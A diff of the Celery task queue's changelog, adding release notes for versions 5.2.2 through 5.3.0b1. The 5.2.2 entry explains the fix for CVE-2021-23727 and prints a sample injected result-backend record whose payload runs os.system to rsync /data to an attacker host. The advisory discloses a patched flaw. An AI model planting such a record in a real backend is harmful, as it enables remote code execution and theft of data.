@@ -5,21 +5,190 @@
 ================
 
 This document contains change notes for bugfix & new features
-in the & 5.2.x series, please see :ref:`whatsnew-5.2` for
+in the master branch & 5.2.x series, please see :ref:`whatsnew-5.2` for
 an overview of what's new in Celery 5.2.
+
+.. _version-5.3.0b1:
+
+5.3.0b1
+=======
+
+:release-date: 2022-08-01 5:15 P.M UTC+6:00
+:release-by: Asif Saif Uddin
+
+- Canvas Header Stamping (#7384).
+- async chords should pass it's kwargs to the group/body.
+- beat: Suppress banner output with the quiet option (#7608).
+- Fix honor Django's TIME_ZONE setting.
+- Don't warn about DEBUG=True for Django.
+- Fixed the on_after_finalize cannot access tasks due to deadlock.
+- Bump kombu>=5.3.0b1,<6.0.
+- Make default worker state limits configurable (#7609).
+- Only clear the cache if there are no active writers.
+- Billiard 4.0.1
+
+
+.. _version-5.3.0a1:
+
+5.3.0a1
+=======
+
+:release-date: 2022-06-29 5:15 P.M UTC+6:00
+:release-by: Asif Saif Uddin
+
+- Remove Python 3.4 compatibility code.
+- call ping to set connection attr for avoiding redis parse_response error.
+- Use importlib instead of deprecated pkg_resources.
+- fix #7245 uid duplicated in command params.
+- Fix subscribed_to maybe empty (#7232).
+- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) #7290.
+- Add security_key_password option (#7292).
+- Limit elasticsearch support to below version 8.0.
+- try new major release of pytest 7 (#7330).
+- broker_connection_retry should no longer apply on startup (#7300).
+- Remove __ne__ methods (#7257).
+- fix #7200 uid and gid.
+- Remove exception-throwing from the signal handler.
+- Add mypy to the pipeline (#7383).
+- Expose more debugging information when receiving unknown tasks. (#7405)
+- Avoid importing buf_t from billiard's compat module as it was removed.
+- Avoid negating a constant in a loop. (#7443)
+- Ensure expiration is of float type when migrating tasks (#7385).
+- load_extension_class_names - correct module_name (#7406)
+- Bump pymongo[srv]>=4.0.2.
+- Use inspect.getgeneratorstate in asynpool.gen_not_started (#7476).
+- Fix test with missing .get() (#7479).
+- azure-storage-blob>=12.11.0
+- Make start_worker, setup_default_app reusable outside of pytest.
+- Ensure a proper error message is raised when id for key is empty (#7447).
+- Crontab string representation does not match UNIX crontab expression.
+- Worker should exit with ctx.exit to get the right exitcode for non-zero.
+- Fix expiration check (#7552).
+- Use callable built-in.
+- Include dont_autoretry_for option in tasks. (#7556)
+- fix: Syntax error in arango query.
+- Fix custom headers propagation on task retries (#7555).
+- Silence backend warning when eager results are stored.
+- Reduce prefetch count on restart and gradually restore it (#7350).
+- Improve workflow primitive subclassing (#7593).
+- test kombu>=5.3.0a1,<6.0 (#7598).
+- Canvas Header Stamping (#7384).
+
+
+
+.. _version-5.2.7:
+
+5.2.7
+=====
+
+:release-date: 2022-5-26 12:15 P.M UTC+2:00
+:release-by: Omer Katz
+
+- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (#7534).
+
+.. _version-5.2.6:
+
+5.2.6
+=====
+
+:release-date: 2022-4-04 21:15 P.M UTC+2:00
+:release-by: Omer Katz
+
+- load_extension_class_names - correct module_name (#7433).
+    This fixes a regression caused by #7218.
+
+.. _version-5.2.5:
+
+5.2.5
+=====
+
+:release-date: 2022-4-03 20:42 P.M UTC+2:00
+:release-by: Omer Katz
+
+**This release was yanked due to a regression caused by the PR below**
+
+- Use importlib instead of deprecated pkg_resources (#7218).
+
+.. _version-5.2.4:
+
+5.2.4
+=====
+
+:release-date: 2022-4-03 20:30 P.M UTC+2:00
+:release-by: Omer Katz
+
+- Expose more debugging information when receiving unknown tasks (#7404).
+
+.. _version-5.2.3:
+
+5.2.3
+=====
+
+:release-date: 2021-12-29 12:00 P.M UTC+6:00
+:release-by: Asif Saif Uddin
+
+- Allow redis >= 4.0.2.
+- Upgrade minimum required pymongo version to 3.11.1.
+- tested pypy3.8 beta (#6998).
+- Split Signature.__or__ into subclasses' __or__ (#7135).
+- Prevent duplication in event loop on Consumer restart.
+- Restrict setuptools>=59.1.1,<59.7.0.
+- Kombu bumped to v5.2.3
+- py-amqp bumped to v5.0.9
+- Some docs & CI improvements.
+
+
+.. _version-5.2.2:
+
+5.2.2
+=====
+
+:release-date: 2021-12-26 16:30 P.M UTC+2:00
+:release-by: Omer Katz
+
+- Various documentation fixes.
+- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).
+
+    When a task fails, the failure information is serialized in the backend.
+    In some cases, the exception class is only importable from the
+    consumer's code base. In this case, we reconstruct the exception class
+    so that we can re-raise the error on the process which queried the
+    task's result. This was introduced in #4836.
+    If the recreated exception type isn't an exception, this is a security issue.
+    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
+    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
+    by setting the task's result to a failure in the result backend with the os,
+    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:
+
+    .. code-block:: python
+
+        {
+              "exc_module": "os",
+              'exc_type': "system",
+              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
+        }
+
+    According to my analysis, this vulnerability can only be exploited if
+    the producer delayed a task which runs long enough for the
+    attacker to change the result mid-flight, and the producer has
+    polled for the task's result.
+    The attacker would also have to gain access to the result backend.
+    The severity of this security vulnerability is low, but we still
+    recommend upgrading.
 
 
 .. _version-5.2.1:
 
 5.2.1
-=======
+=====
+
 :release-date: 2021-11-16 8.55 P.M UTC+6:00
 :release-by: Asif Saif Uddin
 
 - Fix rstrip usage on bytes instance in ProxyLogger.
 - Pass logfile to ExecStop in celery.service example systemd file.
 - fix: reduce latency of AsyncResult.get under gevent (#7052)
-- Limit redis version: <4.0.0. 
+- Limit redis version: <4.0.0.
 - Bump min kombu version to 5.2.2.
 - Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.
 - Remove dependency to case (#7077).
@@ -31,20 +200,22 @@ an overview of what's new in Celery 5.2.
 .. _version-5.2.0:
 
 5.2.0
-=======
+=====
+
 :release-date: 2021-11-08 7.15 A.M UTC+6:00
 :release-by: Asif Saif Uddin
 
 - Prevent from subscribing to empty channels (#7040)
 - fix register_task method.
 - Fire task failure signal on final reject (#6980)
-- Limit pymongo version: <3.12.1 (#7041) 
+- Limit pymongo version: <3.12.1 (#7041)
 - Bump min kombu version to 5.2.1
 
 .. _version-5.2.0rc2:
 
 5.2.0rc2
-=======
+========
+
 :release-date: 2021-11-02 1.54 P.M UTC+3:00
 :release-by: Naomi Elstein
 
@@ -72,7 +243,7 @@ an overview of what's new in Celery 5.2.
 .. _version-5.2.0rc1:
 
 5.2.0rc1
-=======
+========
 :release-date: 2021-09-26 4.04 P.M UTC+3:00
 :release-by: Omer Katz
 
@@ -99,6 +270,7 @@ an overview of what's new in Celery 5.2.
 
 5.2.0b3
 =======
+
 :release-date: 2021-09-02 8.38 P.M UTC+3:00
 :release-by: Omer Katz
 
@@ -126,6 +298,7 @@ an overview of what's new in Celery 5.2.
 
 5.2.0b2
 =======
+
 :release-date: 2021-08-17 5.35 P.M UTC+3:00
 :release-by: Omer Katz
 
@@ -140,6 +313,7 @@ an overview of what's new in Celery 5.2.
 
 5.2.0b1
 =======
+
 :release-date: 2021-08-11 5.42 P.M UTC+3:00
 :release-by: Omer Katz
 
